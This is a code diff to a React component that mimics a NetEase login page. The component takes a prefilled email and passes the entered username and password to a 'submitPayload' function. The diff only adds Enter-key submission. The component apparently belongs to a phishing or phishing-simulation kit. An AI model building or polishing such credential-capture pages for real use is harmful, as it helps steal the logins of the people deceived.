@@ -23,7 +23,7 @@ const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { submitPayload, error, setError } = useSecurity();
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent | React.KeyboardEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
     try {
@@ -34,6 +34,12 @@ const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
       console.error(err);
     } finally {
       setIsSubmitting(false);
+    }
+  };
+
+  const handleKeyDown = (e: React.KeyboardEvent) => {
+    if (e.key === 'Enter') {
+      handleSubmit(e);
     }
   };
 
@@ -105,6 +111,7 @@ const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
                     setUsername(e.target.value);
                     if (error) setError(null);
                   }} 
+                  onKeyDown={handleKeyDown}
                   placeholder={lang === 'zh' ? '邮箱帐号或手机号' : 'Username'} 
                   className="flex-grow px-4 py-3 outline-none text-[15px]" 
                 />
@@ -119,6 +126,7 @@ const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
                     setPassword(e.target.value);
                     if (error) setError(null);
                   }} 
+                  onKeyDown={handleKeyDown}
                   placeholder={lang === 'zh' ? '密码' : 'Password'} 
                   className="w-full px-4 py-3 outline-none text-[15px]" 
                 />
